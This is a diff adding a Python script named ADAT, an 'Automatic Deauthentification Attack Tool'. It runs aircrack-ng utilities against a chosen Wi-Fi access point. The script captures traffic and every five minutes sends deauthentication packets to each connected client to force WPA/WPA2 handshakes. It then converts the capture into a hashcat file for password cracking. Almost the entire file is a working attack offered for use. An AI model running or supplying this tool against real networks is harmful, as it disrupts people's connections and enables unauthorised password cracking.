@@ -1,0 +1,108 @@
+#!/usr/bin/env python3
+
+#MIT License
+#Copyright (C) 2019 plasticuproject.pm.me
+#https://github.com/plasticuproject/adat
+
+
+from termcolor import cprint
+from csv  import reader
+import subprocess
+import argparse
+import time
+import os
+
+dirPath = os.getcwd() + '/'
+essid = ''
+interface=''
+logo = ('''
+
+                                _____       _______ 
+                          /\   |  __ \   /\|__   __|
+                         /  \  | |  | | /  \  | |   
+                        / /\ \ | |  | |/ /\ \ | |   
+                       / ____ \| |__| / ____ \| |   
+                      /_/    \_\_____/_/    \_\_|   
+                                                              
+''')
+
+
+def banner():
+    cprint(logo, 'blue', attrs=['bold'],)
+    cprint('\t\tAutomatic Deauthentification Attack Tool\n', 'red', attrs=['bold'])
+    cprint('A tool to automate the gathering of WPA/WPA2-PSK WiFi hashes with aircrack-ng tools.\n\n', attrs=['bold'])
+    print('To use:')
+    print('Place your interface into monitor mode using airmon-ng. | airmon-ng start interface')
+    print('Use airodump-ng to display all access points in your area. | airodump-ng interface')
+    print('Run this program with the channel number, access point name, and interface.\n\n')
+
+
+def start_dump():
+
+    # runs airodump-ng to start capturing traffic associated with the Access Point
+    global essid, interface
+    parser = argparse.ArgumentParser(description=banner())
+    parser.add_argument('channel', type=str, metavar='Channel', help='Channel number the AP is broadcasting on.')
+    parser.add_argument('essid', type=str, metavar='ESSID', help='ESSID Name of AP to attack.')
+    parser.add_argument('interface', type=str, metavar='Interface', help='Wireless interface to be used.')
+    args = parser.parse_args()
+    channel = args.channel
+    essid = args.essid
+    interface = args.interface
+    
+    subprocess.Popen(['airodump-ng', '-c', channel, '--essid', essid, '-w', 'dump_' + essid, interface])
+
+
+def deauth():
+
+    # parses the airodump-ng log file every 5 minutes and sends 5 deauthentification packet clusters with
+    # aireplay-ng from every station that has been associated with the access point
+    time.sleep(15)
+    try:
+        file = 'dump_' + essid + '-01.csv'
+        while True:
+            mac_list = []
+            with open(file, 'r') as mac_file:
+                csv_reader = reader(mac_file)
+                line_count = 0
+                for row in csv_reader:
+                    if line_count == 2:
+                        bssid = row[0]
+                    if line_count >= 5 and len(row) > 0 and row[5] != ' (not associated) ':
+                        mac_list.append(row[0])
+                    line_count += 1
+                for mac in mac_list:
+                    mac_list.remove(mac)
+                    if mac not in mac_list and len(mac_list) > 0:
+                        subprocess.Popen(['aireplay-ng', '--deauth', '5', '-a', bssid, '-c', mac, interface])
+            time.sleep(300)
+    except KeyboardInterrupt:
+        clean()
+        quit()
+
+
+def clean():
+
+    # renames capture file, creates a Hashcat v3.6+ file, and removes all other log files
+    try:
+        subprocess.call(['cp', 'dump_' + essid + '-01.cap', dirPath + essid + '.cap'])
+        subprocess.call(['aircrack-ng', '-j', dirPath + essid, 'dump_' + essid + '-01.cap'])
+        os.system('rm dump_*')
+    except:
+        quit()
+
+
+def main():
+
+    # main function
+    try:
+        start_dump()
+        deauth()
+    except KeyboardInterrupt:
+        clean()
+        quit()
+
+
+if __name__ == '__main__':
+    main()
+
